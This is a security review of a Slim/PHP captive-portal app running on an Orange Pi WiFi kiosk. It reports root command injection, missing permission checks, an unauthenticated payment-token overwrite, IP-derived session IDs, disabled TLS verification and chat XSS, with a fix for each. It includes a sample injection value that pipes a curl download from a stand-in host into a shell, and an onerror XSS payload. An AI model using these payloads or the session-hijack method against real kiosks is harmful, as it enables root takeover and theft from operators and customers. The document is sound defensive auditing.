# 3DBPoint PHP App Review — Orange Pi Kiosk (`3dp-local` backend + captive-portal frontend)

Based on a direct SSH pull of the live, persistent app copy from the Orange Pi (`/var/www/html/3dbpoint/3dp-local` = backend, `/var/www/html/3dbpoint/public` = the actual nginx-served docroot, plus the Twig templates under `3dp-local/resources/views`). This is the Slim Framework v3 / PHP 7.0 app that replaced the original commercial PisoFi firmware's routing. Confirmed via `bootstrap/app.php` and the live nginx `sites-enabled/default` that this is genuinely the code path serving production traffic. Every finding below marked "confirmed" was independently re-checked against the actual source after an initial agent-assisted sweep; a few lower-priority items are reported as found by that sweep without a second independent read, and are noted as such.

This complements `3DBPoint_Security_Recommendations.md` (which covered the Node.js `license-platform`) — this pass covers the PHP app that actually runs on the kiosk.

## Critical

**[PATCHED 2026-08-08 — see `3DBPoint_USSD_RCE_PoC_Report.md` for the full PoC, live re-exploit confirmation, and fix verification] Unauthenticated remote command injection running as root, in a route open to literally anyone on the hotspot.** `EloadController::getUssdResult()` (`app/Controllers/EloadController.php:1129`) does:
```php
$ussdCode = $request->getParam('ussd_code');
...
$result = exec("sudo python /var/www/html/3dbpoint/sms/runner.py -c '*" . $ussdCode . "#'");
```
`$ussdCode` is concatenated straight into a shell command wrapped in single quotes with no escaping — a value like `x'; curl evil.sh|sh #` breaks out of the quoting. The route (`GET /eload/runussd`, `app/Routes/web.php:124`) sits inside the outer `$app->group('', ...)` block, whose only middleware is `GuestMiddleware` (`app/Routes/web.php:198`). I read `GuestMiddleware.php` directly — it performs **no authentication check whatsoever**; it only redirects ngrok-hosted requests to `/admin`. So any device connected to the kiosk's WiFi (which is the entire point of a coin-op hotspot — no login required to reach this) can send one HTTP request and get arbitrary root command execution via `sudo`. This is a full device compromise, and since the Pi is deployed in the field with SSH/sudo access, likely a path to compromising every kiosk running this codebase. Fix immediately: validate `ussd_code` against a strict allowlist regex (it should be digits/`#`/`*` only) before it ever reaches `exec()`, and use `escapeshellarg()` regardless. Longer term, don't shell out to `sudo python` from a web-request-triggered controller method at all — use a privilege-separated daemon/queue.

**Broken access control: the actual admin mutation endpoints (`/adminapi/*`) check only "is anyone logged in," not permissions — any low-privilege staff account can self-escalate.** In `app/Routes/web.php`, the `/admin` group (views, lines 223–391) is wrapped in `AccountAuthMiddleware` (line 391), which I read in full: it looks up `$_SESSION['user_permissions']` and 404s if the current path isn't in the logged-in account's permission tree — *unless* `$_SESSION['user_admin']` is true, in which case it skips the check entirely. But the parallel `/adminapi` group (lines 393–885 — the actual mutating endpoints: `/adminapi/register-device`, `/adminapi/network/adapters/*`, `/adminapi/clients/mac_binding`, `/adminapi/restorebackup`, `/adminapi/install`/`rollback`/`deletepackage`, `/adminapi/resetpassword`, `/adminapi/accountcleanup`, etc.) has **no `AccountAuthMiddleware` on it at all**. It only inherits the outer `$app->group('', ...)->add(new AuthMiddleware($container))` (line 890), and `AuthMiddleware.php` — which I also read — does nothing but `$this->container->auth->check()`, i.e. "is there any logged-in session." A staff sub-account created with zero granted permissions (so it sees none of the `/admin` views) can still directly `POST /adminapi/restorebackup`, add a MAC binding, install/rollback packages, or register a device, just by knowing the endpoint. Fix: add `AccountAuthMiddleware` to the `/adminapi` group the same way it's applied to `/admin`, and make sure the permission-tree lookup covers the `/adminapi/...` path shape (it currently derives the permission key from the URL path segments, so this should mostly just work once the middleware is attached — but audit each `/adminapi` sub-route against the permission tree once added, since some may need new permission-tree entries).

**Fully unauthenticated e-load provider token overwrite, plus wide-open CORS on the whole API surface.** `CoinsController::syncFromExtension()` handles `POST /api/v1/pkrycns` (`app/Routes/api.php:16`). I checked the route file directly: this route is registered *outside* the inner group that has `->add(new ApiMiddleware($container))` (lines 18–33) — it has no middleware at all. The controller (`app/Controllers/CoinsController.php:38`) takes `accessToken` from the request body with no auth check, calls the Coins.ph API to verify it, and if valid, overwrites the live e-load provider's stored `bearer_token` — repointing the kiosk's real-money e-load integration to a token the attacker controls. Separately, `app/Routes/api.php:38-44` adds `Access-Control-Allow-Origin: *` to every response on `/api/v1/*`, meaning any website a customer's browser has open can also script requests against this endpoint. Fix: require authenticated admin session (or at minimum a shared secret / device-bound API token) before accepting a token swap, and scope CORS to specific trusted origins rather than `*`.

## High

**Session IDs are computed from the client's own IP address (and optionally User-Agent) — no server-side randomness.** `bootstrap/app.php:22` and `:24`:
```php
session_id(md5(isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '127.0.0.1'));
// or, elsewhere:
session_id(md5((isset($_SERVER['REMOTE_ADDR']) ? $_SERVER['REMOTE_ADDR'] : '127.0.0.1') . $agent));
```
with `session.use_strict_mode` explicitly disabled (`ini_set('session.use_strict_mode', 0)`, line 30) around the `session_start()` call. On a coin-op hotspot, client IPs are typically handed out from a small, guessable private DHCP range (e.g. `10.0.0.x`). Any other client on the same LAN can compute `md5($their_own_ip)` isn't useful, but can compute the session ID for *any* IP in the DHCP range and simply present that session ID's cookie — no brute force needed, it's a direct calculation. This means one WiFi customer can hijack another customer's (or, if User-Agent isn't required, potentially staff's) session outright. Fix: use PHP's default cryptographically random session ID generation (just don't call `session_id()` with a derived value at all), and re-enable `session.use_strict_mode`.

**Two more command-injection-shaped `exec()` calls, both reachable by any logged-in staff account (not just full admins) because of the `/adminapi` permission gap above.** `ToolsController::applyPatch()` and `speedtestPost()` (`app/Controllers/ToolsController.php:263, 285, 286, 307`) interpolate request parameters into `exec()`/`sudo exec()` calls without escaping. Combined with the broken-access-control finding above, a zero-permission staff account can reach these. Fix the same way as the USSD finding: allowlist/validate inputs, use `escapeshellarg()`, and once `/adminapi` permissions are fixed, make sure these specific actions require an explicit high-privilege permission, not just "logged in."

**TLS certificate verification is explicitly disabled on payment-provider and push-notification traffic.** `app/ThreeDbPoint/Eload/Coins/Coins.php:1098-1099` (`CURLOPT_SSL_VERIFYHOST`/`CURLOPT_SSL_VERIFYPEER` set to `false`) and `:1009`/`:1027` (Guzzle `['verify' => false]`), and `app/ThreeDbPoint/Notifications/PushNotificationManager.php:123, 167, 231` (same pattern). This makes the e-load payment integration and push notifications vulnerable to on-path MITM (a rogue device on the same LAN, or a compromised upstream network hop, could intercept/tamper with payment API traffic). Fix: remove these overrides and use the system CA bundle; if a specific outbound host has a cert issue, pin its cert rather than disabling verification globally.

## Medium

**Database password passed on the shell command line during backup/migration.** `PackageManager.php:397, 712, 927`: `"mysql --user={$user} --password={$pass} --host={$host} ... < {$sqlScriptFile}"`. Command-line arguments are visible to any other local process via `/proc/[pid]/cmdline` (or `ps aux` in the brief window the process runs) — a real exposure on a shared kiosk host, and these string-interpolated values aren't shell-escaped either (lower risk than the request-driven `exec()` calls above since these come from local config, not user input, but still worth fixing for defense in depth). Fix: use a temporary MySQL option file (`--defaults-extra-file`) with restrictive permissions instead of an inline password, and `escapeshellarg()` the rest.

**Network/device config files are written world-writable.** Repeated `chmod` to `0777`/`777` after writing hostapd/dnsmasq/dhcpcd/MAC-binding config (seen in `app/Helpers/DnsLeaseHelper.php`, `app/Helpers/MacBindingWriter.php`, `app/Helpers/PppoeWriter.php`, `app/Helpers/ThreeDbPointHelper.php`, and referenced in several controllers). Any local process or user on the box (which, given the Pi's use case, could include anyone who's gained even limited shell access) can tamper with network configuration. Fix: tighten to `0640`/`0644` owned by the web server user, and have the process that actually needs to read/write it run as that same owner rather than reaching for `777` to dodge a permissions mismatch.

**`local-console/api.php` and `local-console/index.php` remain fully unauthenticated** (this was already flagged in `3DBPoint_Security_Recommendations.md` as a known Medium item — confirmed still true on this pass, re-verified directly by grepping for any session/token/auth check in the file: none exists). It's under the nginx docroot with no `location` block restricting it, so it's reachable from any client that can reach the kiosk's web port at all, no credentials. It exposes: full license status, live connected-client MAC/IP/bandwidth-usage list, **valid unredeemed WiFi ticket codes** (which lets an attacker redeem tickets someone else paid for — direct revenue theft), coin-insertion financial logs, and the summed wallet balance across all client accounts. Fix: gate it behind the same session auth as the main admin app, and add an nginx `location ^~ /local-console { allow 127.0.0.1; deny all; }` block as defense in depth — don't rely on the path being obscure.

**Stored XSS in the customer-facing chat widget.** `resources/views/chat.twig` and the near-identical `resources/views/desktop.chat.twig` (both around lines 138-147 and 264-283) build chat message HTML by string concatenation — `'<li>...'+this.sender+'</li>... '+this.message+...` — then insert it via jQuery `.append()`, which executes any embedded markup. Messages arrive live over the `/ws` WebSocket from the other chat party (customer↔operator), so either side can inject `<img src=x onerror=...>` and have it execute in the other party's session, including potentially an operator's desktop terminal (`desktop.chat.twig`). Notably, the admin-side Vue chat widget (`js/chat.server.js`) does this correctly via auto-escaped template interpolation — this fix pattern already exists in the codebase, it just wasn't applied to the two Twig chat views. Fix: swap `.append(rawHtmlString)` for `.text()` on the untrusted fields, matching what `chat.server.js` already does.

**Chat/portal WebSocket traffic is hardcoded to plaintext `ws://`**, independent of whether the page itself is loaded over HTTPS. `chat.twig` (`getWsUrl()` ~285-293, and the literal `new ab.Session('ws://10.0.0.1:8080', ...)` at ~299), `desktop.chat.twig` (~288), and `portal.home.twig` (~960-968) all hardcode the scheme. This matches the nginx config (`/ws` proxied to plain `http://10.0.0.1:8080`), so chat content and live connection-status pushes travel unencrypted and sniffable by any other device on the same hotspot. The codebase already has the right fix pattern elsewhere — `js/kamot.js`'s `getWsUrl()` (lines 206-219) picks `wss`/`ws` based on `window.location.href`. Fix: reuse that scheme-aware helper in the three Twig views instead of the hardcoded copies, and terminate `/ws` behind TLS wherever the portal itself is served over HTTPS.

**Client-side login "encryption" gives a false sense of transport security.** `resources/views/auth/signin.twig` (~165-201) AES-encrypts the username/password before POSTing, using a key read out of a plaintext cookie that's sent in the clear on every request over plain HTTP anyway — so a passive LAN sniffer who can see the login request can also see the key and trivially decrypt it. Not a vulnerability introduced by this code per se (the real gap is the lack of TLS on the portal), but this pattern actively creates the appearance of protecting credentials over HTTP, which could discourage actually deploying TLS. Fix: don't rely on this for confidentiality; prioritize serving the portal over HTTPS.

## Lower priority / hardening

- **`TrialLicenseMiddleware` is a no-op but still wired into the global middleware chain** (`app/Routes/web.php:891`) — dead code left over from the licensing rip-out. Harmless as-is, but worth removing to reduce confusion for the next person debugging auth flow (this class of leftover-middleware confusion is exactly what caused the recurring "not registered" bug described in `CODEX_HANDOFF.md`).
- **OneSignal push API key is rendered unmasked into a plain `<input type="text">` value** in `resources/views/admin/system/push_notification.twig:69`. Anyone with DOM/screen access to that admin page (or via the chat XSS above, if same-origin) can read the live key. Mask it server-side (show only last 4 characters) and require re-entry to change, rather than echoing the live secret into every page render. Worth a quick check of other provider-secret fields (`admin/eload/*`, `admin/system/api.twig`) for the same pattern.
- **An orphaned dev build ("vuetify formio" form-builder) is shipped inside the production docroot** at `dist/index.html` / `dist/js/app.*.js` / `dist/js/chunk-vendors.*.js` / `dist/formio.full.min.css`. No secrets or `ws://` URLs found in it, so it's a hygiene/attack-surface issue rather than an active vulnerability — remove unused build artifacts from the served docroot.
- **The `DeviceRegistrationMiddleware`/`DeviceConfigurationMiddleware` rip-out itself looks solid**: no leftover calls into the old commercial vendor's `hasLicense()` flow were found, and `ThreeDbPointLicenseSync` fails *closed* on API/network errors (deactivates registration rather than granting a license on failure) — worth noting as something that's in good shape, not just flagging problems. The numerous `.bak` sibling files (`DeviceRegistrationMiddleware.php.3dbpoint.bak`, `.notregisteredfix.bak`, etc.) sitting alongside the live files aren't web-reachable (they're under `app/`, not the docroot) but are pure clutter at this point — safe to delete once you're confident the live versions are stable, since they're also all captured in git history if ever needed again... except this app isn't the git-tracked repo (that's `license-platform` in a different repo/location) — if there's no version control on the Pi's `3dp-local` tree at all, consider at least tar-snapshotting before deleting the `.bak` files, or better, get this tree into git too.

## General frontend/backend quality notes (non-security)

CSRF tokens are present and correctly wired into essentially every real POST form sampled (signin, signup, admin actions, backup/restore, push notification settings) — the one form found without a CSRF field was a dead, unwired AdminLTE demo sidebar template, not a live endpoint. Twig auto-escaping is used correctly everywhere except the one legitimate `{{ csrf.field | raw }}` pattern for emitting the server-generated hidden CSRF input. `local-console/api.php` uses parameterized PDO throughout (no SQL injection there despite the missing auth). The client-side device fingerprint (`js/kamot.js`) is POSTed to the server for validation rather than trusted client-side, which is the right pattern. None of this needs work — noted so it's clear the review looked, not just found problems.

## Suggested next steps, in order

1. Patch the USSD command injection (`EloadController::getUssdResult`) — trivial fix, critical severity, exploitable by any WiFi customer with zero login.
2. Add `AccountAuthMiddleware` to the `/adminapi` route group so permission checks actually apply to the mutating endpoints, not just the views.
3. Lock down `POST /api/v1/pkrycns` (require auth) and scope the `Access-Control-Allow-Origin` header instead of `*`.
4. Fix session ID generation (stop deriving it from `REMOTE_ADDR`; re-enable `session.use_strict_mode`).
5. Fix the two `ToolsController` `exec()` calls the same way as #1.
6. Re-enable TLS certificate verification on Coins.ph and push-notification HTTP clients.
7. Everything else in Medium/Lower priority as time allows — `local-console` auth and the chat XSS are the two I'd bump up if you have to pick just a couple more.
